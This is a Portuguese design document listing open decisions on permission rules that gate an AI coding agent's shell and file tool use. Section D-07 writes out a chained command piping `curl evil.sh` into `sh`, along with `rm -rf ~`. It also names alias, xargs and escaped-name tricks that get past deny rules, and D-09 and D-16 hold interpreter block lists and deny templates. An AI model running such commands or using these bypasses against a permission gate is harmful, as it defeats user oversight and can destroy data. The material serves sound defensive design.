# Plano 13 — Decisões em aberto e gaps

Toda decisão que este plano ainda não tomou, e todo gap que impede tomá-la. Existe para
**facilitar a decisão** — e para que nenhuma seja tomada por omissão, que é como um plano acaba
construído sobre uma resposta que ninguém deu.

Plano: [README.md](README.md) · Cenários: [scenarios.md](scenarios.md) · Progresso: [progress.md](progress.md)

**Estado:** 🔲 aberta · 🔄 em análise · ✅ decidida · ⛔ travada por terceiro

Decisão em aberto **não** impede planejar; impede **começar a fase** que depende dela.

> Nenhuma decisão deste plano está tomada. Cada uma traz a recomendação de quem escreveu o plano,
> e a leitura do código em 2026-09-26 que a motivou — várias nasceram de uma diferença entre o que
> se supunha e o que o código faz, listada no [README](README.md#o-que-a-leitura-do-código-mudou).
> As garantias do [plano 03](../03-rules-and-audit/decisions.md) **não** estão em aberto aqui: elas
> são o chão sobre o qual estas escolhas são feitas.

---

## F0 — Contract

| ID | Decisão | Gap — o que falta saber | Bloqueia | Resultado | Estado |
|---|---|---|---|---|---|
| D-01 | O que se edita numa regra: só a validade, ou também padrão, escopo e decisão | se a trilha precisa contar "a regra X passou a permitir outra coisa" como fato próprio | B-03, B-12 | — | 🔲 |
| D-02 | Regra revogada some da tela, ou fica consultável num histórico | se alguém volta para procurar o que retirou; o custo é nenhum — a linha nunca é apagada | B-02, B-10, B-21 | — | 🔲 |
| D-03 | Criar regra pela tela pede segundo passo sempre? Pede reautenticação (step-up)? | quanto atrito o usuário aceita numa tela a que ele foi de propósito; step-up depende de `max_age` do OIDC, que ninguém implementou | B-27 | — | 🔲 |
| D-04 | `deny` pode ser sem validade? | o "toda regra expira" do plano 03 foi escrito pensando em `allow`; um `deny` velho incomoda, não expõe | B-09 | — | 🔲 |
| D-05 | De onde vêm o uso por regra e a simulação: da trilha, de `permission_requests`, ou de um contador | se os números da tela precisam bater com os da trilha; custo da consulta; a retenção de 90 dias contra a validade de até 365 | B-11, B-16 | — | 🔲 |
| D-06 | Revogar em lote é atômico ou por item | o que a tela faz com "revoguei 7 de 9" | B-13 | — | 🔲 |
| D-07 | Comando composto e o prefixo: `allow Bash(git status:*)` hoje cobre `git status && curl … \| sh` | se endurecer o matcher do plano 03 quebra algum uso legítimo; o quanto o Claude realmente encadeia comandos | B-08 | 2026-09-26 · **a recomendação**, aplicada antes do plano a pedido do usuário: `allow` de prefixo em linha de shell só cobre comando único (operador, mesmo entre aspas, tira do alcance); `allow` exato casa a string idêntica; `deny` casa por segmento. Lista de operadores única em `shell-syntax.ts`, lida também pelo classificador de risco — que passou a separar no `&` simples | ✅ |
| D-08 | Prefixo em tool de caminho: `Read(/a/src:*)` não cobre `/a/src/x.ts` | se vale oferecer caminho por prefixo, ou esperar uma gramática de caminho | B-08, B-27 | — | 🔲 |
| D-09 | O que é "largo demais", e o que acontece com um padrão assim | a lista de interpretadores e lançadores; se a regra vale para toda porta de criação ou só para a tela | B-08, B-09 | — | 🔲 |
| D-10 | `project` alcança as subpastas? | o plano 06 abre qualquer subpasta como pasta de trabalho; hoje o casamento de pasta é exato | B-09, B-14 | — | 🔲 |
| D-11 | Desfazer a revogação, ou confirmar antes de revogar | se "restaurar" pode dispensar o segundo passo que conceder exige | B-13, B-24 | — | 🔲 |
| D-12 | O que o teste de comando considera: só as regras persistidas, ou também as `session` e o modo da sessão viva | se o usuário testa "em geral" ou "nesta sessão" | B-14 | — | 🔲 |
| D-13 | A listagem pagina? | quantas regras um usuário real acumula — não medido | B-10 | — | 🔲 |

### D-01 — O que se edita numa regra

Três leituras:

- **só a validade** — encurtar e estender. Padrão, escopo e decisão não se editam: mudar é revogar
  e criar;
- **tudo** — um `PATCH` que troca o padrão de `Bash(git status)` para `Bash(git:*)` sob o mesmo id;
- **tudo menos a decisão** — trocar `allow` por `deny` é outra regra, o resto se edita.

O argumento que decide é a trilha e o que aponta para a regra. `audit_entries.rule_id` e
`permission_requests.rule_id` dizem "esta regra respondeu esta invocação" — e "esta regra" tem de
continuar significando o que significava quando respondeu. Um padrão editado sob o mesmo id faz a
entrada de ontem apontar para uma regra que hoje diz outra coisa, e a pergunta "o que deixou isto
rodar?" passa a ter resposta errada.

**Recomendação:** só a validade. "Editar o padrão" na tela é uma ação de conveniência que abre o
assistente preenchido (B-30, duplicar) e, ao salvar, cria a nova e oferece revogar a antiga — duas
linhas na trilha, que é exatamente o que aconteceu.

### D-02 — Revogadas somem ou ficam consultáveis?

Hoje a listagem tira a revogada (é o [plano 03 · D-18](../03-rules-and-audit/decisions.md#d-18--a-regra-revogada-tem-endereço))
e só o `GET /permission-rules/:id` a devolve — da trilha se chega a ela, da tela de regras não. A
linha nunca é apagada ([backend/05](../../architecture/backend/05-persistence.md#as-regras-de-permissão)),
então manter um histórico não custa armazenamento.

**Recomendação:** consultável, por opção. `status=revoked` na listagem e uma aba "Revogadas" na
tela; o **default continua sem elas** — é o que o app Flutter lê (S-01), e é o que a tela mostra ao
abrir. A revogada abre com a data, quem revogou (a trilha diz) e as ações que fazem sentido:
duplicar e, na janela da [D-11](#d-11--desfazer-a-revogação), restaurar.

### D-03 — Segundo passo e step-up ao criar pela tela

O [plano 03 · D-14](../03-rules-and-audit/decisions.md#d-14--escopo-persistido-sempre-pede-o-segundo-passo)
decidiu que todo escopo persistido pede o segundo passo no card. Toda regra criada pela tela é
persistida — então a pergunta é só se o `deny` também o pede, e se há step-up.

**Recomendação:** segundo passo **sempre**, para `allow` e `deny`. No `deny` ele não tem tom de
perigo: diz o que passará a ser recusado, e onde — um `deny` largo demais também surpreende, só que
pelo outro lado. **Step-up fica fora deste plano**: reautenticação recente (`max_age`) é mecanismo
que o [plano 10](../10-integrated-terminal/README.md) propõe para o terminal e que o
[plano 05](../05-hardening-operations/README.md) pode generalizar; quando existir, criar `allow`
`broad` é candidato óbvio a exigi-lo. O servidor não finge verificar o segundo passo — um segundo
passo é interface; o que o servidor garante é a largura ([D-09](#d-09--o-que-é-largo-demais)).

### D-04 — `deny` sem validade?

O [plano 03 · D-02](../03-rules-and-audit/decisions.md#d-02--regra-que-expira) pôs `expires_at NOT
NULL` e o `CHECK` de validade futura. O motivo — "uma regra sem validade sobrevive à razão que a
criou" — é de `allow`: a autorização esquecida é a porta aberta. Um `deny` esquecido é, no pior
caso, o Claude recusando algo que você hoje permitiria — e a tela mostra por quê.

Três saídas: `expires_at` anulável para `deny` (migration que mexe no invariante); validade longa
mas finita para `deny`; tudo igual.

**Recomendação:** `deny` **continua expirando** — o invariante do banco não muda, nem o `CHECK` —,
com default e teto **próprios** (`RC_PERMISSION_RULE_DENY_DEFAULT_LIFETIME_MS`,
`RC_PERMISSION_RULE_DENY_MAX_LIFETIME_MS`), o teto limitado **no código** a cinco anos e o default ≤
teto, na mesma [configuração que falha fechada](../../architecture/shared/07-repository-layout.md#configuração-que-carrega-decisão-de-segurança-falha-fechada)
(S-38). Sugestão de valores: default de um ano, teto de cinco. O "nunca deixe o Claude rodar X" do
usuário vira "não deixe por cinco anos, e me lembre antes" — e o lembrete (B-19) vale para as duas
decisões.

### D-05 — A fonte do uso e da simulação

| Fonte | A favor | Contra |
|---|---|---|
| **`audit_entries`** — entradas de decisão com `rule_id` | append-only e confiável; o número da tela é o que a trilha mostra (S-62); já existe | retenção de 90 dias (o uso é "nos últimos 90 dias"); pede índice novo; `permission` passa a ler a trilha por uma porta de leitura |
| `permission_requests` — o pedido tem `rule_id`, `auto`, a decisão | é tabela do próprio módulo; sem purga | é reescrita ao resolver, não tem piso nem trigger, cresce sem dono ([plano 03 · D-20](../03-rules-and-audit/decisions.md#d-20--a-trilha-são-as-duas-tabelas)); o número divergiria do da trilha no dia 91 |
| contador em `permission_rules` | leitura grátis | escrita no caminho quente do `canUseTool`; uma segunda verdade que só o código garante |

A regra 4 das [fronteiras](../../architecture/backend/03-modules.md#fronteiras--quem-pode-falar-com-quem)
diz que `audit` é *write-only* **de dentro do fluxo** — a decisão de permissão nunca lê a trilha.
Uma rota de consulta da tela de regras não é o fluxo; ela lê pelo `AuditTrailReader`, a porta que o
`AuditQueryModule` já exporta para leitura.

**Recomendação:** a trilha. O uso é contado sobre as entradas de **decisão** (`allowed`/`denied`)
com `rule_id`, escopado pelo usuário **e** pela regra, na janela de retenção, e a tela diz "nos
últimos 90 dias". Índice parcial novo `(user_id, rule_id, seq DESC) WHERE rule_id IS NOT NULL`,
migration versionada nova — `CREATE INDEX` não reescreve linha nem dispara a trigger de `UPDATE`.
O [plano 12](../12-audit-explained/README.md) **não** é pré-requisito: as colunas do veredito
existem desde a `0009` ([plano 03 · D-15](../03-rules-and-audit/decisions.md#d-15--a-correlação-nasce-com-a-entrada));
o que o 12 muda é para onde o link "ver na trilha" leva.

### D-06 — Revogar em lote: atômico ou por item

"Por item" devolve um resultado misto — 7 revogadas, 1 alheia, 1 inexistente —, e a regra 7 do
[AGENTS.md](../../../AGENTS.md) proíbe `200` com erro no corpo. E id alheio ou inexistente num lote
não é acaso: é cliente com lista velha, ou alguém tentando.

**Recomendação:** atômico na validação e na escrita. Todo id é conferido **antes** de qualquer
escrita (inexistente `404`, alheio `403` — a mesma ordem do `DELETE`, nada revogado); a escrita é
**uma** instrução (`UPDATE … WHERE id = ANY($1) AND revoked_at IS NULL RETURNING`), que é atômica e
já é idempotente por item — a já revogada não volta na lista e não gera evento. Teto de 100 ids. Um
evento `permission.ruleRevoked` por regra, com o mesmo `batchId` nos `details`, porque cada regra é
um fato. Falha da trilha depois da escrita segue o que o `RevokePermissionRuleUseCase` já faz: a
revogação fica (é a direção segura) e a chamada falha.

### D-07 — Comando composto e o prefixo

A leitura do `rule-pattern.ts` mostra: o prefixo casa `value === content || value.startsWith(content + ' ')`.
`allow Bash(git status:*)` cobre, portanto, `git status && curl evil.sh | sh`, `git status; rm -rf ~`
não (o `;` cola no token), `git status | sh` sim, `git status $(…)` sim. Nenhum teste cobre operador
de shell. E o próprio Claude Code, cuja gramática o plano 03 disse adotar, trata operador de shell à
parte: um prefixo não autoriza o comando encadeado a ele.

Até aqui isso quase não aparecia, porque o card grava o padrão **exato** da invocação. Com a tela,
o usuário passa a escrever prefixos de propósito — e é aí que o furo vira caminho.

**Recomendação:** o casamento de `Bash` passa a conhecer a decisão, com assimetria deliberada:

- **`allow` de prefixo** não responde comando que tenha operador de controle, substituição ou
  redirecionamento (`;`, `&&`, `||`, `|`, `&`, quebra de linha, crase, `$(`, `<(`, `>(`, `>`, `>>`,
  `<`), **mesmo entre aspas** — sem parser de shell, a falha é fechada: pergunta a mais, nunca
  autorização a mais (S-08, S-09). O `allow` **exato** continua casando a string idêntica: foi aquela
  string que alguém aprovou (S-12);
- **`deny` de prefixo** casa se **qualquer segmento** casar, além do comando inteiro (S-10, S-11);
- a ajuda diz sem eufemismo que `deny` em `Bash` é **lombada, não sandbox**: `alias`, script,
  `xargs`, `$'\x72m'` passam por ele. O que segura um comando perigoso é o humano, e o `deny` é o
  aviso de que alguém já pensou nisso.

O efeito nas regras que já existem só anda na direção segura (S-20): um `allow` passa a responder
menos, um `deny` a recusar mais. Vai para a [ADR-011](../../architecture/shared/00-decisions.md#adr-011--settingsources-project-obrigatório-e-auditoria-ancorada-no-hook-pretooluse)?
Não — não muda a fronteira que ela separou; muda a gramática em
[backend/04](../../architecture/backend/04-claude-integration.md#a-regra-fala-a-gramática-do-claude-não-uma-nossa),
na B-07.

### D-08 — Prefixo em tool de caminho

A fronteira de token do prefixo é o espaço. Para `Read`, `Edit`, `Write`, cujo campo casado é
`file_path`, isso significa que `Read(/a/src:*)` casa `/a/src` e `/a/src qualquer-coisa` — e **não**
casa `/a/src/x.ts`. Na prática, é um padrão exato com outra cara. O Claude Code resolve isso com uma
gramática de caminho própria (padrões estilo gitignore), que o nosso matcher não tem.

Saídas: recusar `:*` em tool de caminho (muda a gramática aceita pelo plano 03); aceitar e explicar;
implementar a gramática de caminho (outro plano, e outra superfície de ataque).

**Recomendação:** aceitar e explicar, sem oferecer. O assistente só oferece `:*` para `Bash`; para
tool de caminho, oferece o caminho exato ou a tool inteira (esta, `broad`). Um `:*` em tool de caminho
que chegar pela API ou pela importação é aceito e ganha o achado `pathPrefix`, que diz o que ele
realmente casa (S-14, S-117). Gramática de caminho fica registrada como candidata a plano futuro no
[progresso](progress.md#escopo-reduzido-ou-adiado).

### D-09 — O que é "largo demais"

O [R-01 do plano 03](../03-rules-and-audit/README.md) dizia: uma regra larga demais reintroduz o
problema que o `settingSources: ['project']` resolveu. Hoje `POST /permission-rules` aceita
`allow Bash` com escopo `always` — há teste de integração que faz isso.

**Recomendação:** uma função pura do domínio, `ruleBreadth(pattern)`, com três valores:

| Largura | O que é | `allow` | `deny` |
|---|---|---|---|
| `unbounded` | `Bash` inteiro; prefixo cujo primeiro token é interpretador, lançador ou elevação (`sh`, `bash`, `zsh`, `fish`, `dash`, `env`, `sudo`, `su`, `doas`, `xargs`, `eval`, `exec`, `nohup`, `time`, `timeout`, `nice`, `python*`, `node`, `deno`, `bun`, `perl`, `ruby`, `php`, `npx`, `pnpx`, `bunx`, `pnpm dlx`, `npm exec`, `yarn dlx`); prefixo que contém operador | recusado, `422 PERMISSION_RULE_TOO_BROAD` | aceito |
| `broad` | tool inteira que não seja `Bash` (inclusive MCP, cujo input não tem campo casável — a tool inteira é o único padrão possível); prefixo de **um** token em `Bash` (`git:*`); prefixo em tool de caminho | exige `acknowledgeBroad: true`, senão `422` com `params.breadth` | aceito |
| `narrow` | exato; prefixo de dois ou mais tokens em `Bash` | aceito | aceito |

A regra vale para **toda** porta de criação — `POST`, importação, restauração, modelo —, porque é o
servidor que garante, não a tela. O card não muda: ele só grava o exato, que é `narrow` (S-34). Regra
antiga que hoje seria recusada **continua valendo** (o `restore` do domínio não reconfere, como com o
teto de validade) e ganha o achado `tooBroad`. A lista de interpretadores é dado do domínio, como a
do `riskHint`; ela nunca é completa, e por isso o prefixo de um token só já é `broad` — quem esquece
um nome na lista ainda passa pela confirmação. O teste de integração que concede `allow Write`
passa a mandar `acknowledgeBroad` — é o contrato que mudou, não o teste que afrouxou.

### D-10 — `project` alcança as subpastas?

A leitura do código: o `projectPath` do pedido é o `workspace.value` da sessão
(`permission-bridge.ts`), e o casamento é `this.projectPath === subject.projectPath` — **igualdade**.
Regra concedida numa sessão em `/raiz/app` não alcança sessão aberta em `/raiz/app/backend`. Com o
[plano 06](../06-workbench/README.md) abrindo qualquer subpasta como aba, a diferença passa a ser
visível todo dia.

Alargar para "a pasta e as subpastas" faria **todas as regras `project` existentes** passarem a
valer em mais lugares sem ninguém ter decidido — é alargar autorização por migration.

**Recomendação:** continua **exato**. A tela diz "só nesta pasta, não nas subpastas" em toda regra
`project`; o teste de comando mostra (S-30, S-100); e o assistente, quando a pasta escolhida tem
regras nas pastas-mãe, diz isso. Se o uso mostrar que exato incomoda, a saída é um escopo novo
(`projectTree`), escolhido explicitamente — nunca a mudança do significado de `project`.

### D-11 — Desfazer a revogação

Os princípios deste conjunto de planos dizem: confirmação só para o destrutivo, e desfazer quando
possível em vez de confirmar. Revogar é a direção segura — o pior que um clique errado faz é o
Claude perguntar de novo —, e o [plano 03](../03-rules-and-audit/F1-rules-ui.md) fez a revogação
direta, sem diálogo.

**Recomendação:** revogar avulso continua direto, com "desfazer" no aviso; revogar **em lote** mostra
a prévia (quantas, quais) — é efeito amplo — e também oferece desfazer. Desfazer é
`POST /permission-rules/restore { ids }`: cria uma regra **nova** com os mesmos campos e a mesma
validade de antes, pela **mesma rotina de concessão** (largura e teto reconferidos, S-90), origem
`restore` com `restoredFrom`, e registra a concessão — a trilha conta "revogou, e desfez". Só dentro
de uma janela curta depois da revogação (sugestão: 10 minutos, configurável e limitada no código) e
só por quem revogou; depois dela, `410 PERMISSION_RULE_RESTORE_WINDOW_CLOSED`, e o caminho é
duplicar pelo assistente, com segundo passo. Dentro da janela, restaurar não pede segundo passo:
é devolver exatamente o que a pessoa tinha segundos antes, e o aviso diz o quê.

### D-12 — O que o teste de comando considera

`POST /permission-rules/evaluate` responde "este comando, nesta pasta, neste modo: permitido, negado
ou perguntado — e por qual regra". As regras `session` vivem em memória e morrem com a sessão; o modo
é da sessão.

**Recomendação:** por padrão, as regras persistidas do chamador, a pasta e o modo informados (default
`default`). Com `sessionId` de uma sessão **viva do chamador**, acrescenta as regras `session` dela e
usa o modo atual — o "por que isto não perguntou agora?" (S-108). A resposta sempre traz as
**ressalvas** do que o CLI decide **antes** de nós e que nenhuma regra nossa alcança: o `deny` das
settings do projeto, o `acceptEdits`, e as tools que ele aprova sozinho sem chamar o `canUseTool`
([plano 03 · D-11](../03-rules-and-audit/decisions.md#d-11--o-mais-restritivo-até-onde-o-canusetool-alcança)).
Sem as ressalvas, "seria perguntado" vira uma promessa que o produto não cumpre.

### D-13 — A listagem pagina?

A listagem de hoje devolve tudo, sem paginação. Ninguém mediu quantas regras um usuário acumula; com
modelos e importação, dezenas viram centenas com facilidade.

**Recomendação:** sem cursor, com **teto** de 1000 itens e `truncated: true` acima dele, e os filtros
no servidor. Regra não é trilha: a lista inteira cabe na tela de quem a revisa, a busca e as abas
recortam, e a análise de redundância (B-15) precisa enxergar o conjunto. Se o teto aparecer em uso
real, cursor sobre `(granted_at, id)` é acréscimo compatível — cenário S-50 cobra o sinal.

---

## F1 — Rules backend

| ID | Decisão | Gap — o que falta saber | Bloqueia | Resultado | Estado |
|---|---|---|---|---|---|
| D-14 | O teto da extensão conta de quando: da concessão ou de agora | se "estender" é renovar ou prolongar | B-12 | — | 🔲 |
| D-15 | Quantas invocações a simulação lê, e o que ela conta | custo da consulta com a trilha cheia; o que o modo da sessão não gravado impede de afirmar | B-16 | — | 🔲 |
| D-16 | Onde moram os modelos de regra, e quais entram | o que o usuário mais aprova — não medido | B-17 | — | 🔲 |
| D-17 | Formato da exportação, validade na importação, e se exportar é auditado | se o arquivo sai da máquina; se validade de outra instalação deve valer aqui | B-18 | — | 🔲 |
| D-18 | Por onde o lembrete de expiração chega | se a preferência do usuário mora no servidor (decisão do plano 06); o que pode atravessar o push | B-19, B-25 | — | 🔲 |

### D-14 — O teto da extensão conta de quando?

Do `grantedAt` (a regra nunca vive mais que o teto, somando extensões) ou de agora (estender é uma
renovação consciente, como conceder de novo).

**Recomendação:** de agora — nova validade ≤ agora + teto da decisão. É o mesmo teste da criação,
e o que força a revisão periódica não é a soma, é o ato: cada extensão é uma decisão explícita, com
segundo passo, registrada com antes e depois (`permission.ruleExpiryChanged`). Contar da concessão
empurraria o usuário para revogar e recriar — o mesmo efeito, com mais ruído na trilha.

### D-15 — Quantas invocações a simulação lê, e o que ela conta

A simulação responde "se esta regra existisse (ou se eu revogasse aquela), o que teria sido
diferente nas últimas N invocações?".

**Recomendação:**

- `limit` default **200**, teto **1000**, sempre as mais recentes do chamador; acima do teto, `400`;
- lê só as entradas de **decisão** — as invocações que chegaram ao `canUseTool`. A `recorded` sem
  decisão foi aprovada pelo CLI sem nos perguntar, e nenhuma regra nossa a teria alcançado (S-124);
- a pasta de cada invocação vem de `session_origins` pelo `sessionId` (o mesmo join que o
  [plano 12](../12-audit-explained/README.md) planeja — quem chegar primeiro o escreve no
  `AuditTrailReader`, o outro reusa); sessão anterior à `0011` não tem pasta, e fica em
  `withoutFolder` (S-125);
- o modo da sessão **não** está na trilha: a simulação assume modo `default` e diz isso na resposta;
- as regras `session` já morreram e não entram;
- a comparação é "antes" (o veredito gravado) × "depois" (`answeringRule` com as regras ativas agora,
  mais os rascunhos, menos as removidas), e só os itens que **mudam** voltam listados (até 100),
  com as contagens de todos.

### D-16 — Onde moram os modelos de regra, e quais entram

**Recomendação:** catálogo versionado **no backend** (`GET /permission-rules/templates`), com nome e
descrição como chaves de i18n — o catálogo passa pelo mesmo teste de gramática e largura das regras
(S-133), o que uma lista no cliente não passaria. Aplicar um modelo é uma **importação** (mesma
prévia, mesma aplicação, mesmo segundo passo), não um caminho novo. Conjunto inicial sugerido:

| Modelo | Regras | Decisão |
|---|---|---|
| Rodar os testes | `Bash(pnpm test:*)`, `Bash(npm test:*)`, `Bash(yarn test:*)` | `allow` |
| Git só leitura | `Bash(git status:*)`, `Bash(git diff:*)`, `Bash(git log:*)`, `Bash(git show:*)`, `Bash(git branch --list:*)` | `allow` |
| Lint e formatação | `Bash(pnpm lint:*)`, `Bash(pnpm format:*)`, `Bash(pnpm typecheck:*)` | `allow` |
| Bloquear rede | `WebFetch`, `WebSearch`, `Bash(curl:*)`, `Bash(wget:*)` | `deny` |
| Bloquear git destrutivo | `Bash(git push --force:*)`, `Bash(git push -f:*)`, `Bash(git reset --hard:*)`, `Bash(git clean:*)` | `deny` |
| Bloquear apagar em massa | `Bash(rm -rf:*)`, `Bash(rm -fr:*)` | `deny` |

"Leitura do repositório", pedida no briefing, **não** entra como modelo de `Read`: a gramática não
limita o caminho à pasta (`Read` inteiro lê `~/.ssh`), e as leituras em geral nem chegam a nós — o
CLI as aprova sozinho. O que cabe honestamente é o "git só leitura", e a ajuda explica o resto.
Modelos sugeridos a partir dos scripts do `package.json` da pasta ficam para quando o
[plano 10](../10-integrated-terminal/README.md) detectar tarefas.

### D-17 — Exportar e importar

**Recomendação:**

- **formato** `{ format: "remote-claude.permission-rules", version: 1, exportedAt, rules: [{ pattern,
  decision, scope, projectPath, expiresAt }] }` — sem `id`, sem `userId`, sem origem. Importar lê
  `pattern`, `decision`, `scope` e `projectPath`, e **ignora** qualquer outro campo (S-139);
- **validade**: a do arquivo é informativa e **não** vale aqui. O lote ganha a default da decisão ou
  a escolhida na tela, com o teto de sempre (S-148) — validade decidida por outra instalação, com
  outro teto, não é decisão de ninguém aqui;
- **limites**: 500 regras, 256 KB — `413 PAYLOAD_TOO_LARGE`;
- **prévia e aplicação**: a prévia devolve um veredito por item e o `digest` do arquivo; a aplicação
  reenvia arquivo, `digest`, índices aceitos, `acknowledgeBroad` por índice e `folderMap`, e
  **revalida tudo antes de escrever** — qualquer aceito que ficou inválido recusa o lote inteiro
  (`422 PERMISSION_RULE_IMPORT_REJECTED`, com `details[]`). A escrita é item a item pela rotina de
  concessão, cada uma auditada; falha no meio deixa o que já nasceu, e a resposta é erro (S-149);
- **auditoria**: exportar grava `permission.rulesExported` (contagem e filtros); importar grava
  `permission.rulesImported` (contagem, criadas, já existentes), além de uma concessão por regra
  nova. O arquivo não é trilha e não carrega segredo, mas é o conjunto de coisas que o Claude pode
  fazer nesta máquina sem perguntar — saber quando ele saiu é barato. A exclusão da "exportação da
  trilha" do [plano 03](../03-rules-and-audit/README.md) continua valendo: isto exporta regras, não
  a trilha.

### D-18 — Por onde o lembrete de expiração chega

**Recomendação:** dois canais.

- **Na web, sempre**: selo na entrada "Regras" da navegação com quantas expiram em sete dias, e uma
  entrada na central de notificações do [plano 06](../06-workbench/README.md) — calculados no cliente
  sobre o resumo (`expiresBefore`), como o aviso de sete dias do plano 03.
- **Por push, por opção** (desligado por padrão): um job diário do módulo `permission`, sob advisory
  lock, manda **um** resumo por usuário com as regras ativas que expiram em até sete dias e ainda não
  foram lembradas, e marca `expiry_reminded_at` (coluna nova; estender a apaga). O push leva só a
  contagem e o link — padrão e pasta atravessariam o provedor de push, que é terceiro (S-151). A
  preferência mora nas configurações do usuário no servidor, se a D-13 do plano 06 as puser lá; se o
  06 decidir preferências só por visitante, o push sai do escopo, registrado no progresso, e o
  lembrete na web fica.

---

## F2 — Rules screen

| ID | Decisão | Gap — o que falta saber | Bloqueia | Resultado | Estado |
|---|---|---|---|---|---|
| — | *(nenhuma decisão em aberto — o que a tela precisa decidir foi decidido acima, no contrato, ou é herdado do plano 03: sete dias, segundo passo, rota própria)* | — | — | — | — |

## F3 — Rule authoring

| ID | Decisão | Gap — o que falta saber | Bloqueia | Resultado | Estado |
|---|---|---|---|---|---|
| D-19 | O assistente é uma rota própria ou um painel sobre a lista | se o link para "criar esta regra" precisa sobreviver ao login | B-27 | — | 🔲 |

### D-19 — Rota própria para o assistente

Painel lateral sobre a lista é mais rápido de abrir; rota própria é um link.

**Recomendação:** rota própria, `/rules/new`, com o rascunho na search (`?tool=&pattern=&decision=&
scope=&folder=&template=`) — é por onde a trilha ("criar regra a partir desta invocação"), o duplicar
e os modelos chegam, e o link continua valendo depois do login, como os filtros de `/audit`. O ULID de
uma regra nunca é `new`, então a rota estática não colide com `/rules/$ruleId`. A search é **dado não
confiável**: cada campo é validado e o inválido é descartado (S-192); nada é criado sem o segundo
passo.

## F4 — E2e

| ID | Decisão | Gap — o que falta saber | Bloqueia | Resultado | Estado |
|---|---|---|---|---|---|
| — | *(nenhuma decisão em aberto — a fase depende só do que as anteriores decidirem)* | — | — | — | — |

---

## Ao decidir

1. Marque a linha com ✅ e preencha **Resultado**: a data, a escolha e o que ela muda.
2. Atualize o documento normativo correspondente — ou abra uma
   [ADR](../../architecture/shared/00-decisions.md), quando a decisão muda uma escolha de
   arquitetura. Decisão registrada só aqui é decisão que o resto do repositório não conhece.
3. Rode `pnpm plan progress 13`: o contador desta tabela sai daqui, no
   [progresso do plano](progress.md) e no [progresso geral](../progress.md).
4. Decisão que **bloqueia** fase sai da tabela de bloqueios do
   [progresso geral](../progress.md) no mesmo momento.

## Convenções

- `D-nn` é sequencial **no plano inteiro** e nunca é reaproveitado — decisão descartada mantém
  o número, com o motivo em **Resultado**.
- Fase sem decisão em aberto **diz isso**, com uma linha própria. Silêncio não é ausência.
- Decisão descoberta durante a execução entra aqui; a mudança que ela causou no plano vai para o
  [progresso](progress.md). Uma é a escolha, a outra é o efeito.
